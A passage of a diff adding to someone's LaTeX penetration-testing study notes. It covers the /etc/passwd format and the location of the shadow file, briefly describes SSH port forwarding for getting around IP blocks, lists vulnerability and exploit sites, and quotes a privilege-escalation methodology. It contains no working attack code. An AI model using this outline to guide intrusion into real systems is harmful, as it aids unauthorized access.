+\texttt{postgres:x:121:130:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash} , which means:
+\texttt{user-name:(x)encrypted-password?:id:group-id:system-name,,,:home-folder:default-shell} \newline
+Ids larger than 99 are created after system instalation, ids between 0-99 are reserved for "users" created during system installation. Passwords encryption file is called \texttt{shadow} and also located in \texttt{../etc} directory.
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{SSH Tunnel - Local and Remote Port Forwarding}
+
+Port forwarding is all about setting proxy and forwarding connections via ssh. If you do not have public IP or your IP is blocked on some site you can use proxy forwarding. In the such situation you must ensure that another machine (or localhost) has ssh configured. This machine can be any computer on connected to the internet. The easier way to show idea of using such proxy is to have machine connected to the same hub/router.
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Ciphering Protocols}
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Important sites}
+\texttt{www.netcraft.com}, provides information about underlying software
+\texttt{www.securityfocus.com} vulnerabilities
+\texttt{www.packetstormsecurity} vulnerabilities
+\texttt{www.exploit-db.org} vulnerabilities
+\texttt{www.cve.mitre.org} vulnerabilities
+\texttt{www.osvdb.com} vulnerabilities repository
+\texttt{www.owasp.org} the free and open software security community
+\texttt{www.hackthebox.com} provides dozens of virtualmachines that you can practise on.
+\texttt{}
+\texttt{}
+\texttt{}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Regexp, grep and regular expressions}
+\subsection{Bash scripts}
+\subsection{Buffer Overflow}
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\subsection{Linux Priviledge Escalation}
+
+g0tmi1k: (Linux) privilege escalation is all about:
+\newline
+Collect - Enumeration, more enumeration and some more enumeration.
+Process - Sort through data, analyse and prioritisation.
+Search - Know what to search for and where to find the exploit code.
+Adapt - Customize the exploit, so it fits. Not every exploit work for every system "out of the box".
+Try - Get ready for (lots of) trial and error.
+
+
+
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+%----------------------------BIBLIOGRAPHY--------------------------------------------
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+\begin{thebibliography}{9}
+\bibitem{how}
+How to Break Web Software; M.Andrews, J.A. Whittaker, Addison Wesley 2009.
+\bibitem{pen}
+Penetration Testing, Hands-on Introduction to Hacking , G. Weidman, No Starch Press 2014
+\bibitem{baut}
+\href{https://www.youtube.com/watch?v=04c0JiE8YNQ}{Szkolenie Z Testowania Bezpieczeństwa Aplikacji Webowych - Pełen OWASP TOP 10 by Dawid Bałut}
+\end{thebibliography}
+
+
+
+\end{document}
